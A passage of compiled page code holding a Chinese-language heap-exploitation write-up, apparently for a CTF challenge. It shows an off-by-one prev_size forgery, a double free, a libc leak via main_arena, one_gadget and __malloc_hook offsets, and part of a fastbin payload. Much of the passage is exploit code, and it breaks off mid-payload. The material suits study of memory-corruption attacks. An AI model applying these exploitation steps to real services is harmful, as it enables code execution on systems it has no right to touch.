`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"C"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"f0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"f0"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),cl=s("p",null,"并且此时bins的结构如下：",-1),pl=s("p",null,[s("img",{src:U,alt:"18"})],-1),rl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"1d0"),s("span",{style:{color:"#A6ACCD"}}," 原本是C的data")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"240"),s("span",{style:{color:"#A6ACCD"}}," 原本是D的struct")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"280"),s("span",{style:{color:"#A6ACCD"}}," 原本是D的key，但是现在被清零了")])])])],-1),yl=s("p",null,"现在，0x582a0存储的是C的data，通过off_by_one溢出覆盖0x582a0的pre_size位。",-1),Fl=s("p",null,"覆盖前是这样",-1),Cl=s("p",null,[s("img",{src:I,alt:"19"})],-1),Dl=s("p",null,"而实际上前面的chunk 已经在fastbin中了。再次分配的时候，会分配出0x280这个堆块。由于它的大小为0x20，所以我们分配时申请的D堆块的大小也是0x20。",-1),Al=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"D"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")+"),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"200"),s("span",{style:{color:"#89DDFF"}},"),"),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"20"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"20"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),il=s("p",null,"分配之后如下",-1),_l=s("p",null,[s("img",{src:N,alt:"20"})],-1),dl=s("p",null,"p64(0x200)伪造了0x582a0的chunk的pre_size为0x200，因为从0x582a0向前0x200个字节恰好是0x580a0,即堆块A对应的data的地址。",-1),fl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"double free")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"DEL"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"A"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"DEL"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"C"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),hl=s("p",null,"这就将0x580a0至0x583a0的内存都free掉了。",-1),ul=s("p",null,[s("img",{src:S,alt:"21"})],-1),El=s("p",null,"此时0x580a0块的大小为0x300",-1),bl=s("p",null,[s("img",{src:$,alt:"22"})],-1),xl=s("p",null,"其被分到了unsortedbin中，bins中只有一个chunk时，其fd、bk指针均指向main_arena",-1),ml=s("p",null,"bins结构如下",-1),gl=s("p",null,[s("img",{src:L,alt:"23"})],-1),kl=s("p",null,[l("0x70: 0x5555557581d0 ◂— 0x0 ------->这个chunk内存被释放了两次，我们最后也是通过他来实现double"),s("code"),l("free的利用。")],-1),zl=s("p",null,"B还没有释放，可以根据B泄漏出libc的基地址等信息。",-1),vl=s("p",null,[s("img",{src:R,alt:"24"})],-1),wl=s("p",null,"0x58140处存放的是B的key的地址，0x18是B的大小。",-1),Bl=s("p",null,"现在unsortedbin位置处的值是0x580a0，我们再分配出一个堆块，它会从unsortedbin中切下一块给我们，如果申请的大小为0x88，实际上分配的就是0x90，0x580a0+0x90=0x58130。",-1),Tl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"a"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"88"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"6"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"88"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),Pl=s("p",null,[s("img",{src:V,alt:"25"})],-1),Ul=s("p",null,"现在0x58140处的值就变成了main_arena+88的值。",-1),Il=s("p",null,[s("img",{src:j,alt:"26"})],-1),Nl=s("p",null,"遇到的问题：怎么把这个main_arena的值输出来呢？",-1),Sl=s("p",null,"按照正常的方法去输出，显示如下：",-1),$l=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"GET"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"B"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"addr "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"u64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"rc"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},")."),s("span",{style:{color:"#82AAFF"}},"ljust"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#A6ACCD"}},"\\x00"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},"))")])])])],-1),Ll=s("p",null,[s("img",{src:q,alt:"27"})],-1),Rl=s("p",null,[s("img",{src:O,alt:"28"})],-1),Vl=s("p",null,"此时堆块B就是",-1),jl=s("p",null,[s("img",{src:G,alt:"29"})],-1),ql=s("p",null,"而这里的size 140737351850872 就是泄漏出的main_arena+88的地址。因为分析原来的结构，我们知道size处被填上了这个地址。",-1),Ol=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},">>>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"hex"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"140737351850872"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"'"),s("span",{style:{color:"#676E95","font-style":"italic"}},"0x7ffff7dd1b78"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"'")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},">>>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"hex"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7dd1b78"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"88"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"'"),s("span",{style:{color:"#676E95","font-style":"italic"}},"0x7ffff7dd1af0"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"'")])])])],-1),Gl=s("p",null,"接下来参考堆利用(一)，得到libc的基地址。但是原本文章里的偏移在此处不适用，尝试用虚拟机中的数据库直接得到偏移。",-1),Ml=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7dd1b78"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"88"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7dd1af0"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#即是 main_arena 的地址")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7dd1af0"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"3c4af0"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7a0d000"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#即是 libc的基地值")])])])],-1),Jl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"main_arena偏移记录")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"libc6_2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"23"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"0ubuntu3_i386"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"so"),s("span",{style:{color:"#A6ACCD"}}," ---> "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"1b2780")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"libc6_2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"23"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"0ubuntu3_amd64"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"so"),s("span",{style:{color:"#A6ACCD"}}," ---> "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"3c3b20")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"libc6_2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"23"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"0ubuntu10_amd64"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"so"),s("span",{style:{color:"#A6ACCD"}}," ---> "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"3c4b20")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"libc6"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"amd64_2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"23"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"0ubuntu3_i386"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"so"),s("span",{style:{color:"#A6ACCD"}}," ---> "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"39bb20")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F78C6C"}},"2.23"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#A6ACCD"}},"main_arena"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#F78C6C"}},"88"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," ---> "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"3c4b78")])])])],-1),Xl=s("p",null,"验证：",-1),Zl=s("p",null,[s("img",{src:M,alt:"30"})],-1),Yl=s("p",null,"⚠️原本一直找不对，是因为我已经先减掉0x88了，而别人的博客中exp没去减掉这个0x88，直接用- 0x3c4b78即可。",-1),Hl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7dd1b78"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"  "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"3c4b78"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7a0d000")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"而：")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"3c4af0"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"88"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"3c4b78")])])])],-1),Kl=s("p",null,[l("虽然还是没有明白是怎么确定"),s("code",null,"0x3c4b78"),l("这个值的，但是很多博客里面直接就这样写了，我也先这样操作好了👌")],-1),Ql=s("p",null,"one_gadget如下：",-1),Wl=s("p",null,[s("img",{src:J,alt:"31"})],-1),so=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"main_arena "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7dd1af0")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"print"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"main_arena --->"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"hex"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"main_arena"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"libc_base "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7dd1af0"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"3c4af0")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"print"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"libc --->"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"hex"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"libc_base"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"system "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," libc_base "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"sym"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"system"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"binsh "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," libc_base "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"search"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"/bin/sh"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},")."),s("span",{style:{color:"#82AAFF"}},"next"),s("span",{style:{color:"#89DDFF"}},"()")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"print"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"system --->"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"hex"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"system"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"print"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"binsh --->"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"hex"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"binsh"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"one_gadget "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," libc_base "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"f0364")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"print"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"one_gadget --->"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"hex"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"one_gadget"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#A6ACCD"}},"\\n"),s("span",{style:{color:"#89DDFF"}},"'")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"malloc_hook "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," libc_base "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"sym"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"__malloc_hook"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"realloc "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," libc_base "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"sym"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"realloc"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]")])])])],-1),lo=s("p",null,"接下来，利用fastbins中大小为0x70的块，进行double free。",-1),oo=s("p",null,[s("img",{src:X,alt:"32"})],-1),no=s("p",null,"以下是为了保护内存，并把realloc_hook写到那个堆块的fd处。",-1),ao=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"heap_base "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758000")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"heap_base"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"70"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"18"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"heap_base"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"50"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#F78C6C"}},"2")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"heap_base"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"250"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")+"),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"41"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"heap_base"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"3e0"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
